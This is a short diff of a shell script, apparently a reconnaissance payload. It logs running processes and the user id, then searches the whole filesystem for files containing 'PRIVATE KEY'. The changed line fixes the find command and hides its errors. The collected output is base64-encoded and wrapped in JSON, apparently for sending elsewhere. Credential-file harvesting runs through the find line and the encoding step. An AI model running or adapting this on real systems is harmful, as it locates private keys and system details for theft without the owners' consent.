@@ -6,7 +6,7 @@ ps -ef  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
 id  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-find / -type f -exec grep -Rl "PRIVATE KEY" {}  >>$OUT 2>&1
+find / -type f -exec grep -Rl "PRIVATE KEY" {} \; >>$OUT  2>/dev/null
 
 b64=$(cat $OUT|base64 -w0)
 echo "{ \"out\": \"${b64}\" }"
